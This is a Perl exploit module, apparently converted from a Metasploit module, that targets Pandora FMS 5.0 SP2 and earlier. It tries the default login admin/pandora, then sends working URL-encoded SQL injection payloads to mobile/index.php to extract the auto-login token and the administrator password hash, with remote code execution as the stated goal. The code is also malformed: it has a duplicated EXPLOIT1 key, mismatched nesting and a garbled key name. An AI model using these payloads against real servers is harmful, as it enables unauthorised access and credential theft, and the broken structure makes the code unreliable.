package PANDORA::MSF::PandoraFmsSqli;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "PandoraFmsSqli";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "DESCRIPTION" => "

        This module attempts to exploit multiple issues in order to gain remote

        code execution under Pandora FMS version <= 5.0 SP2.  First, an attempt

        to authenticate using default credentials is performed.  If this method

        fails, a SQL injection vulnerability is leveraged in order to extract

        the \"Auto Login\" password hash.  If this value is not set, the module

        will then extract the administrator account's MD5 password hash.

      ",
  "METHOD" => "POST",
  "MSF_MODULE" => "pandora_fms_sqli",
  "PATH" => "index.php?sec=gsetup&sec2=godmode/setup/file_manager&",
  "PATHS" => [
    "index.php",
    "index.php",
    "mobile/index.php",
    "index.php",
    "index.php",
    "pandora_console/",
  ],
  "PAYLOAD" => "",
  "REFERENCES" => [
    "http://pandorafms.com/downloads/whats_new_5-SP3.pdf",
    "http://blog.pandorafms.org/?p=2041",
  ],
  "THE USERTITLE TO AUTHENTICATE WITH" => "admin",
  "TITLE" => "Pandora FMS Default Credential / SQLi Remote Code Execution",
  VARIABLES => {
    'USER' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The URI of the vulnerable Pandora FMS instance",
  VALUE => "/pandora_console/",
},
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'NICK' =>       { DESCRIPTION => "", VALUE => "" },
    'PASS' =>       {
  DESCRIPTION => "The password to authenticate with",
  VALUE => "pandora",
},
  },
      },  VALIDATION => {
    'TREGEX' =>       "\\(?<=input type=\"submit\" id=\"submit-go\"\\)\\(.*\\)\\(?=<input id=\"hidden-directory\" name=\"directory\" type=\"hidden\"\\)",
    'TSTRING' =>       "Pandora FMS - the Flexible Monitoring System",

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'index.php',
      PAYLOAD      => 'nick=__USERNAME__&pass=__PASSWORD__&Login=Login',
      TEXT   => 'Sending Exploit #1 Request : [POST] /index.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'mobile/index.php',
      PAYLOAD      => 'action=login&user=1%27%20AND%20%28SELECT%202243%20FROM%28SELECT%20COUNT%28%2a%29%2cCONCAT%280x41644656574e5a75%2c%28SELECT%20MID%28%28IFNULL%28CAST%28value%20AS%20CHAR%29%2c0x20%29%29%2c1%2c50%29%20FROM%20tconfig%20WHERE%20token%20%3d%200x6c6f67696e686173685f707764%20LIMIT%200%2c1%29%2c0x41644656574e5a75%2cFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27msf%27%3d%27msf&password=pass&input=Login',
      TEXT   => 'Sending Exploit #1 Request : [POST] /mobile/index.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'mobile/index.php',
      PAYLOAD      => 'action=login&user=test%27%20AND%20%28SELECT%205612%20FROM%28SELECT%20COUNT%28%2a%29%2cCONCAT%280x455a72576e78714d%2c%28SELECT%20MID%28%28IFNULL%28CAST%28password%20AS%20CHAR%29%2c0x20%29%29%2c1%2c50%29%20FROM%20tusuario%20WHERE%20id_user%20%3d%200%20LIMIT%200%2c1%29%2c0x455a72576e78714d%2cFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27msf%27%3d%27msf&password=pass&input=Login',
      TEXT   => 'Sending Exploit #2 Request : [POST] /mobile/index.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
